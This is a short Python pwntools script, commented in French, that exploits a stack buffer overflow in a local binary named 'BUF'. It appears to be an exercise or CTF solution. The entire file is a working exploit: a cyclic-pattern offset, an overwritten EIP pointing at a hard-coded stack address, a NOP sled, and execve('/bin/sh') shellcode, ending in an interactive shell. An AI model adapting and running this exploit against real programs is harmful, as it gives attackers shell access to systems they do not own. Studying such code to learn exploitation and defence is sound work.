# EXPLOIT.PY
# ----------
# Pour pwntools en Python V3

from pwn import *


PATTERN = 'qaac'        # Valeur EIP au moment du SEG FAULT
ADDRESS = 0xffffd09c    # Contenu de ESP (haut de la stack au moment du SEG FAULT)


proc = process('./BUF')
proc.recvline()

print("\nCr√©ation de l'exploit:")

shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
offset = cyclic_find(PATTERN)
eip = p32(ADDRESS + offset)
nop_ed = b'\x90' * (offset + len(shellcode) + len(eip))


shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

padWithNop = b'\x90' * offset       # on rempli notre tapis roulant de NOP
payload = padWithNop + eip + nop_ed + shellcode # on construit notre charge utile

print("Payload = ", payload)
print("Payload.len = ", len(payload))

proc.send(payload)

proc.interactive()